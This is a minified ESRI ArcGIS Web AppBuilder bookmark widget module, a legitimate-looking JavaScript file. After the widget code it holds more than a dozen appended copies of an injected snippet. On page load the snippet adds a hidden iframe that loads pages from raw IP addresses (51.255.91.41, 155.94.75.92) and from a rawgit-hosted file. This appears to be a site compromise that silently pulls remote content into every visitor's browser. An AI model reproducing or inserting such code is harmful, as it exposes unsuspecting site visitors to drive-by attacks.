// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/Evented dojo/_base/declare dojo/_base/lang dojo/_base/html dojo/_base/array dojo/on esri/SpatialReference jimu/BaseWidget dijit/_TemplatedMixin ./utils".split(" "),function(h,k,b,e,g,l,f,m,n,c){var p=window.Sortable;return k([m,n,h],{baseClass:"dojoDndSource dojoDndTarget dojoDndContainer bookmarker-nodes",templateString:"\x3cdiv\x3e\x3c/div\x3e",nls:null,postCreate:function(){this.inherited(arguments);this.drawerHandle=e.create("div",{"class":"drawer-handle"},this.domNode);this.bookMarkerContainer=
e.create("div",{"class":"webmap"},this.domNode)},startup:function(){this.inherited(arguments);this.config.syncMode&&(!1===this.config.syncMode.webmap&&!1===this.config.syncMode.custom?e.addClass(this.domNode,"hide"):e.removeClass(this.domNode,"hide"));this.sortableBookMarkerNodes=p.create(this.bookMarkerContainer,{sort:!1,disabled:!0,animation:100})},refresh:function(){c.empty(this.bookmarks);this.bookmarks=[];this.config.syncMode&&!0===this.config.syncMode.webmap&&(this.bookmarks=c.readBookmarksInWebmap(this.map));
var a=b.clone(this.config.bookmarks2D);g.forEach(a,function(a){a&&!0===this.config.syncMode.custom&&this.bookmarks.push(a)},this);c.updateBookmarks(this.bookmarks);this.displayBookmarks(this.bookmarks)},_onBookmarkClick:function(a){require(["esri/geometry/Extent"],b.hitch(this,function(b){if(!1!==a.isSaveExtent){var d=a.extent;d.spatialReference?new f(d.spatialReference):new f({wkid:4326});this.map.setExtent(new b(d))}c.layerInfosRestoreState(a.layerOptions)}))},filter:function(a){c.filter(a,this.bookmarks)},
displayBookmarks:function(a){c.empty(a,this.bookMarkerContainer);var f={editBtn:!1,changeImgBtn:!0};g.forEach(a,function(a){if(a){var d=c.createBookMarkNode(a,this.nls,this.folderUrl,f);a.itemNode=d;this.own(l(d,"thumbnail-click",b.hitch(this,b.partial(this._onBookmarkClick,a))))}},this);a.forEach(b.hitch(this,function(a){a&&a.itemNode&&a.itemNode.domNode&&e.place(a.itemNode.domNode,this.bookMarkerContainer,"last")}))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});